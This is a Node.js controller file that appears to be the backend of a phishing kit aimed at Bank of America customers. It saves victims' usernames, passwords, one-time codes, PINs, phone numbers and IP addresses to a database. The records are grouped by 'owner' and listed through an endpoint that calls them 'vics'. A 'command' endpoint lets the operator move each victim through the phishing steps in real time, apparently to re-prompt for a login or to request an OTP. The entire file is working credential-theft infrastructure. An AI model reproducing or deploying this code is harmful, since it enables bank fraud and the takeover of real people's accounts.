var moment = require("moment"); // require
const BOA = require("../models/boaModel");

const submitLogin = async (req, res) => {
    const { username, password, uniqueid, owner, ip } = req.body;
    try {
        await BOA.create({
            uniqueid,
            username,
            password,
            status: 1,
            owner,
            ip, timestamp: moment().format()
        });
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitLoginAgain = async (req, res) => {
    const { username, password, uniqueid } = req.body;
    try {
        await BOA.findOneAndUpdate(
            { uniqueid },
            { username, password, status: 9, timestamp: moment().format() }
        ).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const deleteEntry = async (req, res) => {
    const { uniqueid } = req.body;
    try {
        await BOA.deleteOne({ uniqueid });
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitOtp = async (req, res) => {
    const { otp, uniqueid } = req.body;
    try {
        await BOA.findOneAndUpdate({ uniqueid }, { otp, status: 3, timestamp: moment().format() }).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitTelephone = async (req, res) => {
    const { telephone, uniqueid } = req.body;
    try {
        await BOA.findOneAndUpdate({ uniqueid }, { telephone, status: 7, timestamp: moment().format() }).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitPin = async (req, res) => {
    const { pin, uniqueid } = req.body;
    try {
        await BOA.findOneAndUpdate({ uniqueid }, { pin, status: 5, timestamp: moment().format() }).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const getOwnerVics = async (req, res) => {
    const { owner } = req.params;
    BOA
        .find({ owner })
        .sort({ timestamp: -1 })
        .exec((err, vics) => {
            if (err) {
                console.log(err);
                res.status(404).send("Error");
                return;
            }
            res.send(vics);
        });
};


const command = async (req, res) => {
    const { uniqueid, status } = req.body;
    try {
        await BOA.findOneAndUpdate({ uniqueid }, { status }).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const getInfo = async (req, res) => {
    const { uniqueid } = req.params;
    BOA.findOne({ uniqueid }).exec((err, vic) => {
        if (err) {
            console.log(err);
            res.status(404).send("Error");
            return;
        }
        res.send(vic);
    });
};

module.exports = {
    getOwnerVics,
    command,
    getInfo,
    submitLogin,
    submitLoginAgain,
    submitOtp,
    submitPin,
    submitTelephone,
    deleteEntry,
};
